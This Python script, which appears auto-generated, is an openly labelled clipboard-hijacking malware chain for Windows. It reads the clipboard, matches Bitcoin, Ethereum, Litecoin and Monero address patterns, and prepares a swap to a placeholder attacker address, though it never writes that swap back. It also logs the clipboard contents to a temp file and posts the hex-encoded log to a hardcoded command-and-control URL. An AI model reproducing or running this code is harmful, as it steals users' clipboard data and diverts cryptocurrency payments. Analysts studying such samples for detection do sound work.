#!/usr/bin/env python3
import sys, json, time, re, os, requests
from typing import Dict, Any
import win32clipboard

def is_crypto_address(content: str) -> bool:
    patterns = [
        r'^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$',  # Bitcoin
        r'^0x[a-fA-F0-9]{40}$',                  # Ethereum
        r'^L[a-zA-HJ-NP-Z0-9]{26,33}$',          # Litecoin
        r'^X[1-9A-HJ-NP-Za-km-z]{33}$',          # Monero
    ]
    for pattern in patterns:
        if re.match(pattern, content):
            return True
    return False

def get_clipboard_content() -> str:
    win32clipboard.OpenClipboard()
    try:
        content = win32clipboard.GetClipboardData()
    except TypeError:
        content = ''
    finally:
        win32clipboard.CloseClipboard()
    return content

def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        content = get_clipboard_content()
        is_crypto = is_crypto_address(content)
        result = {'content': content, 'is_crypto': is_crypto}
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'data': {'content': '', 'is_crypto': False},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        content = input_data.get('content', '')
        is_crypto = input_data.get('is_crypto', False)

        result = {
            'replaced': False,
            'original': content,
            'replacement': ''
        }

        if is_crypto:
            attacker_address = "attacker_crypto_address"
            result['replacement'] = attacker_address
            result['replaced'] = True

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        content = input_data.get('content', '')
        is_crypto = input_data.get('is_crypto', False)

        log_file_path = os.path.join(os.environ.get('TEMP', 'C:\\Windows\\Temp'), 'clipboard_log.txt')

        with open(log_file_path, 'a') as log_file:
            log_file.write(f"Crypto: {is_crypto}, Content: {content}\n")

        result = {
            'logged': True,
            'log_file_path': log_file_path
        }

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'data': {'logged': False, 'log_file_path': ''},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

def task_T4(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        logged = input_data.get('logged', False)
        log_file_path = input_data.get('log_file_path', '')

        if not logged or not log_file_path:
            return {'success': False, 'data': {'exfiltrated': False},
                    'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}

        with open(log_file_path, 'rb') as log_file:
            log_content = log_file.read()

        encrypted_payload = log_content.hex()

        c2_url = "https://192.168.142.249/api"
        headers = {'Content-Type': 'application/json'}
        payload = {'data': encrypted_payload}

        for attempt in range(2):
            try:
                response = requests.post(c2_url, json=payload, headers=headers, timeout=15)
                if response.status_code == 200:
                    return {'success': True, 'data': {'exfiltrated': True},
                            'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
            except requests.RequestException:
                if attempt == 1:
                    return {'success': False, 'data': {'exfiltrated': False},
                            'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}

        return {'success': False, 'data': {'exfiltrated': False},
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'data': {'exfiltrated': False},
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}

def main() -> dict:
    """Auto-generated orchestrator — do not edit by hand."""
    outputs: dict = {}
    results: dict = {}
    failed:  list = []
    
    # ── T1: Monitor Clipboard [execution] ──
    try:
        r = task_T1(None)
        results['T1'] = r
        if r.get('success'):
            outputs['T1'] = r.get('data', {})
            print(f'[+] T1 (Monitor Clipboard): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T1 (Monitor Clipboard): FAILED — {err}')
            failed.append('T1')
    except Exception as e:
        print(f'[!] T1 crashed: {e}')
        failed.append('T1')
        results['T1'] = {'success': False, 'error': str(e)}
    
    # ── T2: Replace Crypto Address [defense-evasion] ──
    try:
        r = task_T2(outputs.get('T1', {}))
        results['T2'] = r
        if r.get('success'):
            outputs['T2'] = r.get('data', {})
            print(f'[+] T2 (Replace Crypto Address): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T2 (Replace Crypto Address): FAILED — {err}')
            failed.append('T2')
    except Exception as e:
        print(f'[!] T2 crashed: {e}')
        failed.append('T2')
        results['T2'] = {'success': False, 'error': str(e)}
    
    # ── T3: Log Clipboard Content [data-processing] ──
    try:
        r = task_T3(outputs.get('T1', {}))
        results['T3'] = r
        if r.get('success'):
            outputs['T3'] = r.get('data', {})
            print(f'[+] T3 (Log Clipboard Content): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T3 (Log Clipboard Content): FAILED — {err}')
            failed.append('T3')
    except Exception as e:
        print(f'[!] T3 crashed: {e}')
        failed.append('T3')
        results['T3'] = {'success': False, 'error': str(e)}
    
    # ── T4: Exfiltrate Logs [exfiltration] ──
    try:
        r = task_T4(outputs.get('T3', {}))
        results['T4'] = r
        if r.get('success'):
            outputs['T4'] = r.get('data', {})
            print(f'[+] T4 (Exfiltrate Logs): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T4 (Exfiltrate Logs): FAILED — {err}')
            failed.append('T4')
            r2 = task_T4(outputs.get('T3', {}))
            if r2.get('success'):
                outputs['T4'] = r2.get('data', {})
                failed.remove('T4')
    except Exception as e:
        print(f'[!] T4 crashed: {e}')
        failed.append('T4')
        results['T4'] = {'success': False, 'error': str(e)}
    
    success = len(failed) == 0
    if success:
        print('[+] All tasks completed successfully')
    else:
        print(f'[-] Failed tasks: {failed}')
    return {'success': success, 'failed': failed,
            'outputs': outputs, 'results': results}

if __name__ == '__main__':
    import json
    result = main()
    print('__RESULT__=' + json.dumps(result))